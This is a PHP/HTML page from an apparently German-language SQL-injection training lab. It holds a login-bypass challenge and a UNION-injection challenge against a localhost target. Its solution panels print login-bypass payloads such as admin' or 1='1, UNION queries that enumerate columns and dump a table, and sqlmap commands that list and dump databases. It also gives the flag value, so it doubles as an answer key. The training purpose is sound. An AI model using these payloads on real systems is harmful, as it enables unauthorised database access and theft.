<!DOCTYPE html>
<html lang="en">
<title> SQL-Injection</title>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <base href="http://localhost:8026" />
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>

    <form action="index.php" method="POST">

        <input type="checkbox" id="flag2" name="check" />
        <input type="checkbox" id="checkbox" name="check_round1">
        <input type="checkbox" id="s1_solution" name="s1_solution" value="1">
        <input type="checkbox" id="s2_solution" name="s2_solution" value="1">
        <input type="checkbox" id="s2_alternative" name="solution">


        <div class=" title">
            <div class="inhalt">
                <div style="margin: 10px 70px;font-size: 18px; position: absolute; float : left;"><a href="http://localhost">Startseite</a></div>

                <h1> WEB Exploitation</h1>
            </div>
        </div>

        <div class="box">
            <h1> SQL-Injection</h1>
            <ul>
                <li>
                    <a href="Einleitung/einleitung1.php" style="text-decoration:none;"><span style="color :#0c2461; ">Einleitung</span></a>
                </li>

                <li><button type="submit" name="stufe1"> <span style="color :#0c2461;">Anfreifbare Login Seite (1)</span></button>
                </li>
                <li>
                    <a href="challRepariert/chall1.php" style="text-decoration: none;"><span style="color :#0c2461;">Erste Challenge repariert</span></a>
                </li>
                <li><span style="color:#0c2461">Union-Injection (2)</span>
                    <label for="flag2" class="flag2">Union-Injection Union-Injection (2)</label>
                <li>
                    <a href="challRepariert/chall2.php" style="text-decoration: none;"><span style="color:#0c2461">Zweite Challenge repariert</span></a>
                </li>
            </ul>
        </div>

        <div class="rahmen">

            <div class="box">

                <div class="auswahl">


                    <?php
                    $flag = trim($_POST['flag_eingabe']);
                    if (isset($_POST['stufe1']) | (isset($_POST['login']))) {

                        include 'conn.php';
                        echo '<div class = "chall1" style="color:blue;width: 555px;margin: 5px 60px;position: absolute; font-size:16px;"><strong>Challenge 1: Demonstration einer SQL-Injection-Sicherheitslücke </strong></div>';

                        echo "<br/> <br/>";
                        echo '<div style="color: black; text-align: left; margin: 17px 32px;font-size: 14px;float: left;position: absolute;width: 636px;"><strong> In dieser Challenge entdeckst du Möglichkeiten zum Einloggen , ohne Passwort zu kennen.</br></strong></div>';
                        echo '<div><a href="Einleitung/einleitung1.php/#Chall1" style="color:gray;margin:44px 147px; position:absolute;font-size: 13px;width: 95px;"> Mehr ansehen</a>
                        </div> ';

                        echo '<div class="round1">  Beginn
                            <label for="checkbox" style="margin: -51px -98px;">Beginn Beginn</label>  </div>';
                        if (isset($_POST['stufe1'])) {
                            echo '<div class="round2">  Lösungen
                            <label for="s2_solution" >Lösungen</label></div>';
                        }
                        echo '<div class="round2">  Lösungen  <label for="s2_solution" class="begin1">Lösung</label>  </div>';
                        echo "<br/><br/><br/>";

                        include 'sql_select.php';
                        if ($status == false) {
                            echo "<br/>";
                            include 'ausgabe.php';
                        }

                        if ($status == true) {
                            echo '<div id="erg" ><h3> Ungültige Eingabe!</h3> </div>';
                        }
                    } else if ((isset($_POST['flag_btn'])) | (isset($_POST['back']))) {
                        include("check_flags.php");
                        if ($_POST['flag_eingabe'] == "1") {
                            echo "";
                            /*$curl = curl_init();
                            curl_setopt($curl, CURLOPT_URL, "http://main-website:3000/check-flag");
                            curl_setopt($curl, CURLOPT_POST, true);
                            curl_setopt($curl, CURLOPT_POSTFIELDS, "challenge_name=sql-injection_level-2&challenge_flag=480");
                            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                            $output = curl_exec($curl);
                            curl_close($curl);*/
                        } else {
                            echo '<span style="color:red; text-align: center; margin: 35px -30px; font-size: 13px;position: absolute; ">Ungültige Eingabe</span>';
                        }
                    } else {
                        echo '<h2 style="margin: 13px 252px;position: absolute;width:206px;"> SQL-INJECTION </h2>';
                        echo '<div style="width: 600px;height: 200px;margin: 59px 30px;position: absolute; font-size: 13px;text-align:left;">
                        <span style="margin:30px;">SQL-Injection ist das Ausnutzen einer Sicherheitslücke in Zusammenhang mit SQL-Datenbanken. Die Sicherheitslücke entsteht durch einen Programmierfehler in einem Programm, das auf die Datenbank zugreift. <br><br> Durch diesen Programmierfehler kann ein Angreifer Datenbankbefehle einschleusen und abhängig vom Einzelfall weitere Daten aus der Datenbank auslesen,
                        Daten unberechtigt ändern oder löschen oder sogar die Kontrolle über den kompletten Datenbankserver übernehmen (*).</span>
                <a href="Einleitung/einleitung1.php/#def" style="color:gray;margin:25px 327px;width:100px; position:absolute;"> Mehr ansehen</a>
                </div>';

                        echo '<h2 style="margin: 271px 225px;position: absolute;"> Challengeübersicht </h2>';
                        echo '<div style="width: 600px;height: 200px;margin: 313px 30px;position: absolute; font-size: 13px;text-align:left;">
                        <span style="margin:30px;">Die challenges sind aufeinander aufgebaut. Um die zweite Challenge" UNION-Injection" starten zu können, wird ein Flag aus der erster Challenge benötigt. <br><br><br><br><br><br><br><br>
                        Jede Challenge bietet Hinweise an, die dich das Lösen der Challenges unterstützen. </span>
                         </div> ';
                        echo '<div style="background-image: url(popup.png); width:250px; height:88px; position: absolute;margin: 362px 166px;">    </div> ';
                        echo '<div><a href="Einleitung/einleitung1.php/#uebersicht" style="color:gray;margin:495px 174px; position:absolute;font-size: 13px;width: 95px;"> Mehr ansehen</a>
                        </div> ';
                        echo '<div style="position: absolute;margin: 665px 20px;"> (*) - Defination aus Wikipedia</div> ';
                    }

                    ?>


                </div>
            </div>
        </div>

        <div class="flag_popup">
            <div class="flag_eingabe">
                <input type="text" id="flag_text" name="flag_eingabe" autocomplete="off" placeholder="Geben sie Flagge ein:" style="width: 322px;height: 40px; margin: 1px 20px; ">
            </div>
            <div class="flag_btn">
                <input type="submit" name="flag_btn" value="submit" style="  height: 40px;width: 350px; margin: 10px 30px;
                    background: #00dbff52; border-top-right-radius: 10px; border-top-left-radius: 10px;border-bottom-right-radius: 10px; border-bottom-left-radius: 10px;">
            </div>
        </div>
        <div class="solution2">
            <p style="text-align:center;">1. Gebe dem Benutzername den Wert <strong> admin' or 1='1 </strong> ein. </p>
            <p style="text-align:center;">2. Alternative Lösungen:</p>
            <p style="text-align:center;"><strong> admin' OR 1='1;--</strong></p>
            <p style="text-align:center;"> <strong> admin' # </strong></p>
            <p style="text-align:center;"><strong> admin' or 1=1# </strong></p>
        </div>



        <div class="solution"><label for="s2_alternative" style="margin: 295px 10px;"> Alternative Lösung </label>
            <p style="font-size: 13px">1. Exacte Anzahl der Spalten: Erhöhe Spaltennummer, bis ein Fehler zeigt. Die Tabelle hat insgesamt 5 Spalten.</p>
            <p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 order by 5</strong> </p>
            <p style="font-size: 13px"> 2. In diesem Fall sind alle Spalten anfällig. Das kannst du folgende Query testen:
            <p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 union select 'a','a','a','a','a' </strong>
                <- a ist biliebig </p>
                    <p style="font-size: 13px">3. Hier geht es um die von nicht sichtbarer Spalte Umsatz das gesamtes Wert zu berechnen und herauszufinden.3 Spalten sind sichtbar. Das kannst du ausnutzen, weil die alle anfällig sind. Deswegen kannst du eine von dieser Spalte Z.b Folgende Query eingeben:</p>
                    <p style="font-size: 13px"><strong>http://localhost:8026/union_injection.php?id=1 union select sum(Umsatz), null,null,null,null from Filiale </strong> </p>
                    <p style="font-size: 13px"> Das Ergebnis sollte <strong> "480"</strong> zeigen.</p> <br>
                    <p style="color:blue; text-decoration:underline; margin:0px 10px;"> Alternative Lösung </p>
        </div>

        <div class="alternative_s2">
            <legend style="font-size: 13px;white-space: pre-wrap;"><?php echo "Alternative kannst du diese Challenge mithilfe SQLMap lösen. SQLMap ist ein open source Tool zum Durchführen einer SQL-Injection. Dieses Tool ist unter Kali Linux verfügbar. Gebe folgende Befehle in Terminal ein:"; ?></legend>
            <p style="font-size: 13px;white-space: pre-wrap;"> <strong><?php echo "->sqlmap -u http://localhost:8026/union_injection.php?id=1 --dbs"; ?></strong> (hier wirst du sehen, welche Datenbank existiert.) </p>
            <p style="font-size: 13px;white-space: pre-wrap;"><strong> <?php echo "-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test --tables</strong> (hier wirst du sehen, welche Tabellen in Datenbank existieren)"; ?></p>
            <p style="font-size: 13px;white-space: pre-wrap;"><strong> <?php echo "-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test -T Filiale --dump"; ?></strong> (hier zeigt aller Inhalte der Tabelle * Filiale *) </p>
            <p style="background-image: url(sqlmap.png); height: 350px;"></p>

        </div>
        <div class="popup">

            <label for="checkbox" class="cancel"> </label>
            <div class="round"> Stufe 1
            </div>
            <div class="inhalt"></div>
            <?php
            echo "Du kannst den Nutzernamen  admin verwenden. Finde heraus wie du dich ohne Password einloggen kannst. <br /> <br />";

            ?>

            <div class="name">
                <input type="text" name="username" placeholder="username" autocomplete="off">
                <input type="password" name="password" placeholder="Password">
            </div>
            <div class="btn">
                <input type="submit" name="login" value="submit">
            </div>
    </form>

    <div class="hint">
        <ul>
            <p>Hinweise:</p>
            <li>
                <div class="content">
                    <h3>Anführungszeichen (')</h3>
                    <p> Anführungszeichen (') schließt oder öffnet die SQL-Anweisung. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> Boolescher Bedingungen Schlüsselwort OR </h3>
                    <p> 1=1 ist eine Anweisung, die immer den Wert true liefert. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> # charactor</h3>
                    <p> Das Doppelkreuz (#) kommentieren den Rest der SQL-Anfrage aus.</p>
                </div>
            </li>
            <li>
                <div class="content">
                    <h3> Das Semikolon (;)</h3>
                    <p> Das Semikolon (;) beendet die SQL-Anweisung </p>
                </div>

            </li>

        </ul>
    </div>
    </div>
    </div>

    </form>

</body>

</html>